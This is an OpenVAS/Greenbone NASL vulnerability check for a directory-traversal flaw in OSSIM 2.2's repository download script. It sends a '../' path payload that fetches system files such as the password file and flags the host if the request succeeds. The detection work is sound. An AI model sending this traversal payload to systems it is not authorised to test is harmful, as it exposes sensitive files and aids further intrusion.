CPE = "cpe:/a:alienvault:open_source_security_information_management";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100542" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-03-19 11:14:17 +0100 (Fri, 19 Mar 2010)" );
	script_bugtraq_id( 38780 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "OSSIM 'file' Parameter Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/38780" );
	script_xref( name: "URL", value: "http://www.alienvault.com/community.php?section=News" );
	script_xref( name: "URL", value: "http://www.cybsec.com/vuln/cybsec_advisory_2010_0306_ossim2_2_arbitrary_file_download.pdf" );
	script_xref( name: "URL", value: "http://ossim.net/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_ossim_web_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "OSSIM/installed" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "The vendor has released an update to address this issue. Please see
  the references for more information." );
	script_tag( name: "summary", value: "OSSIM is prone to a directory-traversal vulnerability because it fails
  to sufficiently sanitize user-supplied input data." );
	script_tag( name: "impact", value: "Exploiting the issue may allow an attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "OSSIM 2.2 is affected. Other versions may also be vulnerable." );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( dir, "/repository/download.php?file=../../../../../../../../" + file + "&name=passwd.txt" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!buf){
		continue;
	}
	if(egrep( pattern: pattern, string: buf, icase: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 0 );

